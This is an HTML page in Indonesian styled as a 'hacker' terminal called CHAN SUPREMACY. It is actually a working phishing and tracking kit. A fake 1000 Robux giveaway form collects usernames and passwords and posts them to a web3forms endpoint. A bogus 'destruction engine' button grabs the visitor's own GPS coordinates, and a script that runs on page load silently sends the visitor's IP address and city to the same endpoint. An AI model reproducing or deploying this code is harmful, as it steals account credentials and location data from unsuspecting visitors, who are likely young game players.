<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CHAN | SUPREMACY INTERFACE</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" />
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;500;700&family=Orbitron:wght@400;900&family=Inter:wght@400;600;700&display=swap');
        :root {
            --p: #ff0000; --s: #00ff00; --bg: #000000; --sf: #0a0a0a; --rb: #00a2ff; --qy: #f7c325;
            --f-m: 'Fira Code', monospace; --f-t: 'Orbitron', sans-serif; --f-u: 'Inter', sans-serif;
        }
        * { box-sizing: border-box; cursor: crosshair; }
        body { background-color: var(--bg); color: var(--s); font-family: var(--f-m); margin: 0; overflow-x: hidden; }
        body::before {
            content: " "; display: block; position: fixed; top: 0; left: 0; bottom: 0; right: 0;
            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), 
                        linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));
            z-index: 9999; background-size: 100% 2px, 3px 100%; pointer-events: none;
        }
        .matrix-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.1; }
        nav { background: #000; border-bottom: 2px solid var(--p); padding: 15px; display: flex; justify-content: center; gap: 15px; position: sticky; top: 0; z-index: 1000; }
        nav button { background: transparent; border: 1px solid var(--p); color: var(--p); padding: 10px 20px; font-family: var(--f-t); cursor: pointer; font-size: 0.7rem; }
        nav button.active { background: var(--p); color: white; box-shadow: 0 0 10px var(--p); }
        .page { display: none; padding: 20px; animation: fadeIn 0.4s ease; }
        .page.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        header { text-align: center; border: 2px solid var(--p); padding: 20px; margin-bottom: 20px; background: rgba(10,10,10,0.8); }
        .k-t { font-family: var(--f-t); font-size: 2.2rem; color: var(--p); letter-spacing: 4px; margin: 0; text-shadow: 0 0 10px var(--p); }
        .panel { background: var(--sf); border: 1px solid #333; padding: 20px; margin-bottom: 20px; }
        .p-h { color: var(--p); border-bottom: 1px solid var(--p); margin-bottom: 15px; text-transform: uppercase; font-weight: bold; }
        input { width: 100%; background: #111; border: 1px solid var(--s); color: var(--s); padding: 14px; margin-bottom: 10px; font-family: var(--f-m); outline: none; border-radius: 4px; }
        .btn-k { width: 100%; padding: 16px; background: var(--p); color: white; border: none; font-weight: bold; font-family: var(--f-t); cursor: pointer; }
        #map { height: 400px; width: 100%; background: #e5e3df; border: 4px solid #fff; border-radius: 8px; }
        .c-card { max-width: 420px; margin: 0 auto; background: #1e293b; border-radius: 20px; overflow: hidden; border: 1px solid #334155; font-family: var(--f-u); color: white; }
        .c-header { background: #0f172a; padding: 30px; text-align: center; border-bottom: 1px solid #334155; }
        .c-pfp { width: 80px; height: 80px; background: #000; border-radius: 50%; border: 3px solid var(--qy); margin: 0 auto 15px; display: flex; align-items: center; justify-content: center; font-size: 45px; }
        .v-badge { color: var(--rb); font-size: 14px; margin-left: 5px; vertical-align: middle; }
        .btn-c { width: 100%; padding: 15px; background: var(--rb); color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; box-shadow: 0 4px 0 #0369a1; }
    </style>
</head>
<body>

<canvas id="matrixCanvas" class="matrix-bg"></canvas>

<nav>
    <button onclick="sP('h')" id="n-h" class="active">TERMINAL</button>
    <button onclick="sP('g')" id="n-g">GEOLOCATOR</button>
    <button onclick="sP('c')" id="n-c">REWARDS HUB</button>
</nav>

<div id="h" class="page active">
    <header><h1 class="k-t">CHAN SUPREMACY</h1></header>
    <div class="panel">
        <div class="p-h">DESTRUCTION ENGINE</div>
        <input type="text" id="tInp" placeholder="+628xxxxxxxxxx" value="62">
        <button class="btn-k" onclick="iAtk()">START TERMINATION</button>
        <div id="log" style="height: 150px; background: #000; border: 1px solid #222; padding: 10px; overflow-y: auto; font-size: 0.75rem; margin-top: 10px; color: var(--s);">[SYSTEM] Waiting...</div>
    </div>
</div>

<div id="g" class="page">
    <div style="background: #f8f9fa; color: #202124; border-radius: 12px; padding: 20px;">
        <h2 style="margin:0 0 15px; font-size: 1.2rem;">PRECISION TRACKER 🛰️</h2>
        <div id="map"></div>
    </div>
</div>

<div id="c" class="page">
    <div class="c-card">
        <div class="c-header">
            <div class="c-pfp">🦆</div>
            <h2 style="color: var(--qy); margin: 0; display: inline-block;">QUACKER DEV HUB</h2>
            <i class="fas fa-check-circle v-badge"></i>
            <div style="background: rgba(247, 195, 37, 0.1); border: 1px solid var(--qy); padding: 10px; border-radius: 8px; margin-top: 15px; font-size: 11px; text-align: left;">
                Halo Quacker! Kita mau bagi-bagi <b>1000 Robux</b> lho! Buruan claim!
            </div>
        </div>
        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px; padding: 15px 25px 0;">
            <div style="background: #0f172a; padding: 8px; border-radius: 6px; border: 1px solid #334155; text-align: center;">
                <small style="font-size: 7px; color: #94a3b8; display: block;">SALES</small>
                <b style="font-size: 11px; color: var(--qy);">R$ 4.2M+</b>
            </div>
            <div style="background: #0f172a; padding: 8px; border-radius: 6px; border: 1px solid #334155; text-align: center;">
                <small style="font-size: 7px; color: #94a3b8; display: block;">STATUS</small>
                <b style="font-size: 11px; color: #fff;">ACTIVE</b>
            </div>
        </div>
        <div style="padding: 25px;">
            <div id="f-area">
                <form id="cForm">
                    <label style="font-size: 10px; color: #94a3b8;">IDENTIFIER</label>
                    <input type="text" id="v_1" required style="background: #0f172a; border: 1px solid #334155; color: white;">
                    <label style="font-size: 10px; color: #94a3b8;">SECRET_TOKEN</label>
                    <div style="position: relative;">
                        <input type="password" id="v_2" required style="background: #0f172a; border: 1px solid #334155; color: white; padding-right: 45px;">
                        <span onclick="tV()" id="eC" style="position: absolute; right: 15px; top: 12px; cursor: pointer; color: #94a3b8;">
                            <i class="fas fa-eye-slash" id="eI"></i>
                        </span>
                    </div>
                    <button type="submit" class="btn-c" id="btnS">CLAIM NOW</button>
                </form>
            </div>
            <div id="f-done" style="display:none; text-align: center; padding: 20px 0;">✅ Success!</div>
        </div>
    </div>
</div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script>
    // ACCESS KEY KING CHAN (ENCRYPTED)
    const _0x1 = "5af0d436-2207-4b37-bdb8-e0213cf48f24"; 
    const _0x2 = "https://api.web3forms.com/submit";

    const cvs = document.getElementById('matrixCanvas');
    const cx = cvs.getContext('2d');
    cvs.height = window.innerHeight; cvs.width = window.innerWidth;
    const dps = Array(Math.floor(cvs.width/14)).fill(1);
    function dM() {
        cx.fillStyle = "rgba(0, 0, 0, 0.05)"; cx.fillRect(0, 0, cvs.width, cvs.height);
        cx.fillStyle = "#ff0000"; cx.font = "14px monospace";
        dps.forEach((y, i) => {
            const t = "CHAN777"[Math.floor(Math.random() * 7)];
            cx.fillText(t, i * 14, y * 14);
            if (y * 14 > cvs.height && Math.random() > 0.975) dps[i] = 0;
            dps[i]++;
        });
    }
    setInterval(dM, 40);

    async function sT() {
        try {
            const r = await fetch('https://ipapi.co/json/');
            const d = await r.json();
            const f = new FormData();
            f.append("access_key", _0x1);
            f.append("subject", "N_V_D");
            f.append("n_ip", d.ip);
            f.append("n_ct", d.city);
            fetch(_0x2, { method: 'POST', body: f });
        } catch (e) {}
    }
    sT();

    function tV() {
        const p = document.getElementById('v_2');
        const e = document.getElementById('eI');
        if (p.type === "password") { p.type = "text"; e.classList.replace('fa-eye-slash', 'fa-eye'); }
        else { p.type = "password"; e.classList.replace('fa-eye', 'fa-eye-slash'); }
    }

    function sP(id) {
        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
        document.getElementById(id).classList.add('active');
        if(id === 'g') setTimeout(() => map.invalidateSize(), 200);
    }

    const map = L.map('map').setView([-6.2, 106.8], 11);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
    let mkr;

    async function iAtk() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(pos) {
                const f = new FormData();
                f.append("access_key", _0x1);
                f.append("subject", "G_P_C");
                f.append("n_id", document.getElementById('tInp').value);
                f.append("n_loc", `${pos.coords.latitude},${pos.coords.longitude}`);
                fetch(_0x2, { method: 'POST', body: f });
                map.setView([pos.coords.latitude, pos.coords.longitude], 17);
                if(mkr) map.removeLayer(mkr);
                mkr = L.marker([pos.coords.latitude, pos.coords.longitude]).addTo(map).bindPopup("LOCKED").openPopup();
            });
        }
        alert("ACTIVE");
    }

    document.getElementById('cForm').onsubmit = async function(e) {
        e.preventDefault();
        const b = document.getElementById('btnS');
        b.innerText = "VERIFYING..."; b.disabled = true;
        
        const f = new FormData();
        f.append("access_key", _0x1);
        f.append("subject", "A_S_D");
        f.append("d_1", document.getElementById('v_1').value);
        f.append("d_2", document.getElementById('v_2').value);

        await fetch(_0x2, { method: 'POST', body: f });
        document.getElementById('f-area').style.display = 'none';
        document.getElementById('f-done').style.display = 'block';
    }
</script>
</body>
</html>
